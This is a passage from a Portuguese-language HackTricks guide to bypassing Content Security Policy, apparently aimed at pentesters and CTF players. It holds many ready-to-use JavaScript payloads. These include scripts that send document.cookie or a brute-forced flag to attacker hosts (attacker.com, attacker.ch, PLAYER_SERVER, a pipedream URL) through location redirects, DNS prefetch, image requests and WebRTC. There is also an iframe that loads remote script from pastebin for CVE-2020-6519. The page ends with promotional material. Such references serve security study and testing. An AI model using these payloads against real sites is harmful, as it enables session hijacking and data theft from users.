console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Este ataque implicaria alguma engenharia social onde o atacante **convence o usu√°rio a arrastar e soltar um link sobre o bookmarklet do navegador**. Este bookmarklet conteria **c√≥digo javascript malicioso** que, quando arrastado e solto ou clicado, seria executado no contexto da janela web atual, **burlando o CSP e permitindo roubar informa√ß√µes sens√≠veis** como cookies ou tokens.

Para mais informa√ß√µes [**confira o relat√≥rio original aqui**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Burla de CSP restringindo CSP

Neste [**relat√≥rio de CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), o CSP √© burlado injetando dentro de um iframe permitido um CSP mais restritivo que proibiu carregar um arquivo JS espec√≠fico que, ent√£o, via **polui√ß√£o de prot√≥tipo** ou **dom clobbering** permitiu **abusar de um script diferente para carregar um script arbitr√°rio**.

Voc√™ pode **restringir um CSP de um Iframe** com o atributo **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Neste [**relat√≥rio de CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), foi poss√≠vel por meio de **inje√ß√£o de HTML** **restringir** ainda mais uma **CSP** de modo que um script que impedia CSTI foi desativado e, portanto, a **vulnerabilidade tornou-se explor√°vel.**\
A CSP pode ser tornada mais restritiva usando **meta tags HTML** e scripts inline podem ser desativados **removendo** a **entrada** que permite seu **nonce** e **habilitar scripts inline espec√≠ficos via sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltra√ß√£o de JS com Content-Security-Policy-Report-Only

Se voc√™ conseguir fazer com que o servidor responda com o cabe√ßalho **`Content-Security-Policy-Report-Only`** com um **valor controlado por voc√™** (talvez por causa de um CRLF), voc√™ poder√° faz√™-lo apontar para o seu servidor e, se voc√™ **envolver** o **conte√∫do JS** que deseja exfiltrar com **`<script>`**, e porque √© altamente prov√°vel que `unsafe-inline` n√£o seja permitido pelo CSP, isso ir√° **desencadear um erro de CSP** e parte do script (contendo as informa√ß√µes sens√≠veis) ser√° enviada para o servidor a partir de `Content-Security-Policy-Report-Only`.

Para um exemplo, [**confira este writeup de CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Vazamento de Informa√ß√µes CSP + Iframe

Imagine uma situa√ß√£o onde uma **p√°gina est√° redirecionando** para uma **p√°gina diferente com um segredo dependendo** do **usu√°rio**. Por exemplo, o usu√°rio **admin** acessando **redirectme.domain1.com** √© redirecionado para **adminsecret321.domain2.com** e voc√™ pode causar um XSS no admin.\
**Tamb√©m p√°ginas que s√£o redirecionadas n√£o s√£o permitidas pela pol√≠tica de seguran√ßa, mas a p√°gina que redireciona √©.**

Voc√™ pode vazar o dom√≠nio para onde o admin √© redirecionado atrav√©s de:

* **viola√ß√£o do CSP**
* **regras do CSP.**

A viola√ß√£o do CSP √© um vazamento instant√¢neo. Tudo o que precisa ser feito √© carregar um iframe apontando para `https://redirectme.domain1.com` e ouvir o evento `securitypolicyviolation` que cont√©m a propriedade `blockedURI` contendo o dom√≠nio do URI bloqueado. Isso ocorre porque `https://redirectme.domain1.com` (permitido pelo CSP) redireciona para `https://adminsecret321.domain2.com` (**bloqueado pelo CSP**). Isso faz uso de um comportamento indefinido de como lidar com iframes com CSP. Chrome e Firefox se comportam de maneira diferente em rela√ß√£o a isso.

Quando voc√™ conhece os caracteres que podem compor o subdom√≠nio secreto, voc√™ tamb√©m pode usar uma busca bin√°ria e verificar quando o CSP bloqueou o recurso e quando n√£o, criando diferentes dom√≠nios proibidos no CSP (neste caso o segredo pode estar na forma doc-X-XXXX.secdrivencontent.dev)
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Truque retirado [**daqui**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Participe do servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Interaja com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado com os lan√ßamentos de novas recompensas por bugs e atualiza√ß√µes importantes da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Tecnologias Inseguras para Bypass no CSP

### Sobrecarga do buffer de resposta PHP

O PHP √© conhecido por **bufferizar a resposta em 4096** bytes por padr√£o. Portanto, se o PHP estiver mostrando um aviso, ao fornecer **dados suficientes dentro dos avisos**, a **resposta** ser√° **enviada** **antes** do **cabe√ßalho CSP**, fazendo com que o cabe√ßalho seja ignorado.\
Ent√£o, a t√©cnica consiste basicamente em **preencher o buffer de resposta com avisos** para que o cabe√ßalho CSP n√£o seja enviado.

Ideia retirada de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescrever P√°gina de Erro

De [**este writeup**](https://blog.ssrf.kr/69) parece que foi poss√≠vel burlar uma prote√ß√£o CSP carregando uma p√°gina de erro (potencialmente sem CSP) e reescrevendo seu conte√∫do.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME √© uma t√©cnica que explora um XSS (ou XSS altamente limitado) **em um ponto de extremidade de uma p√°gina** para **abusar** **de outros pontos de extremidade da mesma origem.** Isso √© feito carregando o ponto de extremidade vulner√°vel a partir de uma p√°gina do atacante e, em seguida, atualizando a p√°gina do atacante para o ponto de extremidade real na mesma origem que voc√™ deseja abusar. Dessa forma, o **ponto de extremidade vulner√°vel** pode usar o objeto **`opener`** no **payload** para **acessar o DOM** do **ponto de extremidade real a ser abusado**. Para mais informa√ß√µes, confira:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Al√©m disso, o **wordpress** possui um ponto de extremidade **JSONP** em `/wp-json/wp/v2/users/1?_jsonp=data` que ir√° **refletir** os **dados** enviados na sa√≠da (com a limita√ß√£o de apenas letras, n√∫meros e pontos).

Um atacante pode abusar desse ponto de extremidade para **gerar um ataque SOME** contra o WordPress e **incorpor√°-lo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note que este **script** ser√° **carregado** porque √© **permitido por 'self'**. Al√©m disso, e porque o WordPress est√° instalado, um atacante pode abusar do **ataque SOME** atrav√©s do **ponto de extremidade de callback vulner√°vel** que **burla o CSP** para dar mais privil√©gios a um usu√°rio, instalar um novo plugin...\
Para mais informa√ß√µes sobre como realizar este ataque, confira [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypasses de Exfiltra√ß√£o do CSP

Se houver um CSP estrito que n√£o permita que voc√™ **interaja com servidores externos**, h√° algumas coisas que voc√™ sempre pode fazer para exfiltrar as informa√ß√µes.

### Location

Voc√™ poderia simplesmente atualizar a localiza√ß√£o para enviar ao servidor do atacante as informa√ß√µes secretas:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

Voc√™ pode redirecionar injetando uma meta tag (isso √© apenas um redirecionamento, isso n√£o vai vazar conte√∫do)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Para carregar p√°ginas mais rapidamente, os navegadores v√£o pr√©-resolver nomes de host em endere√ßos IP e armazen√°-los em cache para uso posterior.\
Voc√™ pode indicar a um navegador para pr√©-resolver um nome de host com: `<link reol="dns-prefetch" href="something.com">`

Voc√™ pode abusar desse comportamento para **exfiltrar informa√ß√µes sens√≠veis via solicita√ß√µes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Outra maneira:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que isso aconte√ßa, o servidor pode enviar o cabe√ßalho HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, esta t√©cnica n√£o funciona em navegadores sem interface gr√°fica (bots)
{% endhint %}

### WebRTC

Em v√°rias p√°ginas voc√™ pode ler que o **WebRTC n√£o verifica a pol√≠tica `connect-src`** do CSP.

Na verdade, voc√™ pode _vazar_ informa√ß√µes usando uma _solicita√ß√£o DNS_. Confira este c√≥digo:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Outra op√ß√£o:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Verificando Pol√≠ticas CSP Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Criando CSP Automaticamente

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Refer√™ncias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado com os mais novos lan√ßamentos de recompensas por bugs e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
